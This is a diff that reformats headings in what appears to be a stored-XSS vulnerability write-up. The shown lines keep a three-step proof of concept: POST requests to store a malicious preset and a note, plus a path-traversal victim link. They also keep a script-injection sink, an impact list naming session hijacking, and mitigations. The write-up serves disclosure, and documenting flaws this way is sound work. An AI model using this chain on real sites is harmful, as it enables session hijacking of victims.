@@ -74,8 +74,10 @@ Execution flow:
 
 s.textContent = el.dataset.cfg;
 document.head.appendChild(s);
+```
 
-🧪 Proof of Concept
+### Proof of Concept
+
 Step 1: Store malicious preset
 
 POST /api/account/preferences
@@ -91,6 +93,7 @@ POST /api/account/preferences
     }
   }
 }
+
 Step 2: Create malicious note
 
 POST /api/notes
@@ -101,12 +104,15 @@ POST /api/notes
 }
 Step 3: Send victim link
 /note/NOTE_ID/..%2F..%2Fapi%2Faccount%2Fpreferences%2Freader-presets%2Fevil
-💥 Impact
+
+
+### Impact
 Stored XSS triggered via crafted URL
 Session hijacking
 No authentication required for preset access
 Minimal user interaction required
-🛠️ Mitigation
+
+### Mitigation
 Encode panel using encodeURIComponent
 Restrict preset endpoints to authenticated users only
 Harden DOMPurify configuration
